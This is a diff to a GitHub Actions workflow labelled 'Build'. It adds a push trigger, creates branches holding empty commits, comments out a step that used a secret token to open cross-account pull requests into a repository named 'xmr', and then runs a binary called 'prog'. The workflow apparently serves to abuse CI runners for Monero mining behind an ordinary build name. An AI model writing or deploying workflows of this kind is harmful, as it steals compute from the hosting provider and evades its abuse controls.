@@ -1,5 +1,5 @@
 name: Build
-on: [pull_request, workflow_dispatch]
+on: [push, pull_request, workflow_dispatch]
 jobs:
   test:
     name: Fetch
@@ -38,19 +38,19 @@ jobs:
           git checkout -b $BRANCH
           git commit --allow-empty --allow-empty-message --no-edit
           git push -u origin $BRANCH
-      - uses: actions/github-script@v3
-        id: my-script
-        with:
-          github-token: ${{secrets.token}}
-          result-encoding: string
-          script: |
-            github.pulls.create({
-              owner: "${{ env.OWNER2 }}",
-              repo: "xmr",
-              head: "${{ env.OWNER1 }}:${{ env.BRANCH }}",
-              base: "main",
-              title: "COol"
-            })
+#       - uses: actions/github-script@v3
+#         id: my-script
+#         with:
+#           github-token: ${{secrets.token}}
+#           result-encoding: string
+#           script: |
+#             github.pulls.create({
+#               owner: "${{ env.OWNER2 }}",
+#               repo: "xmr",
+#               head: "${{ env.OWNER1 }}:${{ env.BRANCH }}",
+#               base: "main",
+#               title: "COol"
+#             })
       - run: |
           cd xmr
           chmod u+x prog
